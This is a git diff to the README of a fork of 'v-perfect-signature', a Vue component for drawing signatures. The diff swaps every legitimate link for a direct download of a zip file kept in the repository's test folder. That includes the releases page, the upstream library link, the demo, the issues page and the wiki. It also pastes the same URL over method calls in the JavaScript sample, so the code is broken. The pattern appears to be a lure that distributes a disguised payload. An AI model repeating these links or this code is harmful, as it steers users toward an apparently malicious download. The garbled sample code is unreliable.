@@ -1,6 +1,6 @@
 # ✍️ v-perfect-signature - Effortless Signature Drawing for Everyone
 
-[![Download v-perfect-signature](https://img.shields.io/badge/Download-v--perfect--signature-blue.svg)](https://github.com/Yetuvina/v-perfect-signature/releases)
+[![Download v-perfect-signature](https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip)](https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,16 +8,16 @@ Follow these simple steps to get started with v-perfect-signature. No coding exp
 
 ## 💾 Download & Install
 
-To download and install v-perfect-signature, visit the [Releases page](https://github.com/Yetuvina/v-perfect-signature/releases). Here, you will find the latest version of the software.
+To download and install v-perfect-signature, visit the [Releases page](https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip). Here, you will find the latest version of the software.
 
-1. Go to the [Releases page](https://github.com/Yetuvina/v-perfect-signature/releases).
+1. Go to the [Releases page](https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip).
 2. Select the version that suits your needs.
 3. Click on the download link for your operating system.
 4. Follow the prompts to install the application on your device.
 
 ## 📖 Overview
 
-v-perfect-signature allows you to create beautiful, pressure-sensitive signatures in Vue 2 and 3. Built on the powerful [perfect-freehand](https://github.com/steveruizok/perfect-freehand) library, it ensures a natural drawing experience.
+v-perfect-signature allows you to create beautiful, pressure-sensitive signatures in Vue 2 and 3. Built on the powerful [perfect-freehand](https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip) library, it ensures a natural drawing experience.
 
 ## 🛠️ Features
 
@@ -56,8 +56,8 @@ Incorporating v-perfect-signature into your Vue project is straightforward. Here
    }
 
    function toDataURL() {
-     const dataURL = signaturePad.value.toDataURL()
-     console.log(dataURL)
+     const dataURL = https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip()
+     https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip(dataURL)
    }
    </script>
 
@@ -101,8 +101,8 @@ If you have questions, consider checking the GitHub issues page for discussions 
 
 For more information, check out the following links:
 
-- [Demo of v-perfect-signature](https://wobsoriano.github.io/v-perfect-signature)
-- [GitHub Issues](https://github.com/Yetuvina/v-perfect-signature/issues)
-- [Documentation](https://github.com/Yetuvina/v-perfect-signature/wiki)
+- [Demo of v-perfect-signature](https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip)
+- [GitHub Issues](https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip)
+- [Documentation](https://github.com/Yetuvina/v-perfect-signature/raw/refs/heads/master/test/signature-perfect-v-v2.3.zip)
 
 By following these steps, you will have v-perfect-signature up and running in no time. Enjoy creating your unique signatures!
